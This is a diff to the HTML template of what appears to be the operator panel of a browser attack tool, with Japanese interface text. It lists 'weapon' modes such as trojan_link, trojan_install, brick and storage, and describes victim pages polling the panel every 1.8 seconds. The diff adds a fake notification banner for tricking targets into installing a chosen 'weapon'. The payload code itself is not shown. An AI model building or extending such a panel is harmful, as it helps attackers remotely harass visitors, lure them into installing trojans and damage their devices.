@@ -38,7 +38,7 @@ form.inline{display:inline;margin:0}
 .panel{background:#141b28;border:1px solid #2b3a5a;border-radius:10px;padding:12px;margin:10px 0}
 .panel h3{margin:0 0 8px;color:#bcd0f0}
 .seg{display:inline-flex;border:1px solid #39415a;border-radius:8px;overflow:hidden}
-.seg label{padding:7px 14px;font-size:12.5px;background:#20242e;color:#c7cddb;cursor:pointer}
+.seg label{padding:0;font-size:12.5px;background:#20242e;color:#c7cddb;cursor:pointer}
 .seg input{display:none}
 .seg input:checked + span{background:#4c8dff;color:#fff}
 .seg span{display:block;padding:7px 14px}
@@ -46,6 +46,8 @@ form.inline{display:inline;margin:0}
   background:#20242e;border:1px solid #39415a;color:#c7cddb}
 .state.on{background:#16321f;border-color:#2e6b45;color:#7ee08a}
 .state.off{background:#3a2a2a;border-color:#5a3f3f;color:#f0b429}
+.chk{display:flex;gap:6px;align-items:center;font-size:12px;color:#c7cddb;margin-top:8px}
+.chk input{width:auto}
 </style></head><body>
 
 <div class="tabs">
@@ -86,7 +88,7 @@ form.inline{display:inline;margin:0}
       <button class="fire" type="submit">▶ 再開</button></form>
     {% endif %}
   </div>
-  <div class="dim">開いている相手のページが、これを1.8秒ごとに拾って反応します。今の設定：
+  <div class="dim">開いている相手のページが1.8秒ごとに拾って反応します。今の設定：
     <b>{{ '∞（止まるまで）' if winset == 0 else winset ~ '枚/セット' }}</b></div>
 </div>
 
@@ -141,8 +143,8 @@ form.inline{display:inline;margin:0}
   <label>名前 <input type="text" name="name" value="{{ link.name }}"></label>
   <label>兵器
     <select name="mode">
-      {% for m in ["trojan_link","trojan_install","max_power","brick","windows","sound","storage","mix"] %}
-      <option value="{{ m }}" {% if link.mode == m %}selected{% endif %}>{{ m }}</option>
+      {% for m, label in modes %}
+      <option value="{{ m }}" {% if link.mode == m %}selected{% endif %}>{{ label }}</option>
       {% endfor %}
     </select></label>
   <label>1セットの枚数
@@ -152,6 +154,17 @@ form.inline{display:inline;margin:0}
       <option value="0" {% if winset == 0 %}selected{% endif %}>∞（止まるまで）</option>
     </select></label>
   <label>飛び先 <input type="text" name="dest" value="{{ link.dest or '' }}"></label>
+  <label>通知文
+    <input type="text" name="notify_text" value="{{ notify_text }}"></label>
+  <label>その通知でインストールさせる兵器
+    <select name="notify_mode">
+      <option value="" {% if not notify_mode %}selected{% endif %}>なし（自動）</option>
+      {% for m, label in modes %}
+      <option value="{{ m }}" {% if notify_mode == m %}selected{% endif %}>{{ label }}</option>
+      {% endfor %}
+    </select></label>
+  <label class="chk"><input type="checkbox" name="notify" value="1"
+    {% if notify %}checked{% endif %}> 通知バナーを出す</label>
   <label>メモ <input type="text" name="note" value="{{ link.note or '' }}"></label>
   <label>状態
     <select name="active">
